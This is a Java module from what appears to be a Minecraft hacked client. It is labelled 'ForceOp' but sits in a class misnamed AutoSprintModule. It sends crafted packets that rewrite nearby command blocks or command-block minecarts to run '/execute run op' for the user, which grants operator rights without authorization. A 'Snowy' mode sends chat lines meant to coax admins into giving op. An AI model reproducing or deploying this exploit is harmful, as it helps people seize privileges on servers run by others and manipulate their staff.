package net.shadow.feature.module;

import net.minecraft.block.Blocks;
import net.minecraft.block.entity.CommandBlockBlockEntity;
import net.minecraft.client.util.math.MatrixStack;
import net.minecraft.entity.Entity;
import net.minecraft.entity.vehicle.CommandBlockMinecartEntity;
import net.minecraft.network.packet.c2s.play.UpdateCommandBlockC2SPacket;
import net.minecraft.network.packet.c2s.play.UpdateCommandBlockMinecartC2SPacket;
import net.minecraft.util.math.BlockPos;
import net.minecraft.util.math.Vec3d;
import net.shadow.Shadow;
import net.shadow.event.events.RenderListener;
import net.shadow.feature.base.Module;
import net.shadow.feature.base.ModuleType;
import net.shadow.feature.configuration.CustomValue;
import net.shadow.feature.configuration.MultiValue;
import net.shadow.utils.ChatUtils;
import net.shadow.utils.RenderUtils;
import net.shadow.utils.Utils;

import java.awt.*;

public class AutoSprintModule extends Module implements RenderListener {
    final MultiValue mode = this.config.create("Mode", "CmdMinecart", "CmdMinecart", "CmdBlock");
    final CustomValue<String> command = this.config.create("Command", "/execute run op " + Shadow.c.getSession().getUsername());
    BlockPos selblock = new BlockPos(0, 0, 0);
    Entity selminecart = null;

    public AutoSprintModule() {
        super("ForceOp", "gain op", ModuleType.EXPLOIT);
    }

    @Override
    public String getVanityName() {
        return this.getName() + " [" + mode.getThis() + "]";
    }

    @Override
    public void onEnable() {
        Shadow.getEventSystem().add(RenderListener.class, this);
        if (mode.getThis().equalsIgnoreCase("Snowy")) {
            new Thread(() -> {
                Shadow.c.player.sendChatMessage("Hey can i have op~");
                Utils.sleep(500);
                Shadow.c.player.sendChatMessage("Im a girl~");
                Utils.sleep(2000);
                Shadow.c.player.sendChatMessage("uwu");
            }).start();
        }
        if (mode.getThis().equalsIgnoreCase("cmdminecart")) {
            int id = 696969;
            for (Entity mcart : Shadow.c.world.getEntities()) {
                if (mcart instanceof CommandBlockMinecartEntity) {
                    if (mcart.distanceTo(Shadow.c.player) > 7) return;
                    id = mcart.getId();
                    selminecart = mcart;
                }
            }
            if (id == 696969) {
                ChatUtils.message("No Suitable Entity Found");
                this.setEnabled(false);
                return;
            }
            ChatUtils.message("Performing Exploit...");
            Shadow.c.player.networkHandler.sendPacket(new UpdateCommandBlockMinecartC2SPacket(id, command.getThis(), false));
            this.setEnabled(false);
        } else if (mode.getThis().equalsIgnoreCase("cmdblock")) {
            ChatUtils.message("Performing Exploit...");
            for (int x = -7; x < 8; x++)
                for (int y = -7; y < 8; y++)
                    for (int z = -7; z < 8; z++) {
                        BlockPos pos = Shadow.c.player.getBlockPos().add(new BlockPos(x, y, z));
                        if (Shadow.c.world.getBlockState(pos).getBlock() == Blocks.COMMAND_BLOCK) {
                            selblock = pos;
                            break;
                        }
                    }
            Shadow.c.player.networkHandler.sendPacket(new UpdateCommandBlockC2SPacket(selblock, "RESET", CommandBlockBlockEntity.Type.REDSTONE, false, false, false));
            Shadow.c.player.networkHandler.sendPacket(new UpdateCommandBlockC2SPacket(selblock, command.getThis(), CommandBlockBlockEntity.Type.REDSTONE, false, false, true));
            this.setEnabled(false);
        }
    }

    @Override
    public void onDisable() {
        new Thread(() -> {
            try {
                Thread.sleep(1000L);
                selminecart = null;
                selblock = new BlockPos(0, 0, 0);
                Shadow.getEventSystem().remove(RenderListener.class, this);
            } catch (InterruptedException e) {
                e.printStackTrace();
            }
        }).start();
    }

    @Override
    public void onUpdate() {

    }

    @Override
    public void onRender() {

    }

    @Override
    public void onRender(float partialTicks, MatrixStack matrix) {
        if (mode.getThis().equalsIgnoreCase("block")) {
            if (selblock.getX() == 0 && selblock.getY() == 0 && selblock.getZ() == 0) return;
            RenderUtils.renderObject(new Vec3d(selblock.getX(), selblock.getY(), selblock.getZ()), new Vec3d(1, 1, 1), new Color(100, 100, 100, 100), matrix);
        } else {
            if (selminecart == null) return;
            RenderUtils.renderEntity(selminecart, new Color(100, 100, 100, 100), matrix);
        }
    }
}
